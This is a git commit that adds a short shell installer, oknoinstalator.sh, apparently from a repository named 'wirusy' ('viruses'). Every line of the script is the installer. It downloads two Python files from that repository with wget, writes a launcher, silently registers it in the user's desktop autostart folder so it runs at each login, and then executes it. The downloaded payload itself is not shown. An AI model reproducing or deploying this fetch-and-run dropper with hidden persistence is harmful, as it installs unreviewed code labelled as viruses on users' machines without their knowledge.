eb1c914b7725055434ccbcb81b8a2c42eb61912c
MichalkapDeveloper <90312060+MichalkapDeveloper@users.noreply.github.com>
2022-02-07 17:52:41 +0100

    Create oknoinstalator.sh

---
+++ oknoinstalator.sh
@@ -0,0 +1,12 @@
+rm okno.py
+rm addautostart.py
+wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/okno.py'
+wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
+user=$(whoami)
+rm okno.sh
+echo "python3 /home/$user/okno.py" > okno.sh
+eval $"chmod +x '/home/$user/okno.sh'"
+eval $"rm '/home/$user/.config/autostart/?.desktop'"
+python3 /home/$user/addautostart.py '??' './home/$user/okno.sh'
+eval $"chmod +x '/home/$user/.config/autostart/??.desktop'"
+eval $"bash '/home/$user/okno.sh'"
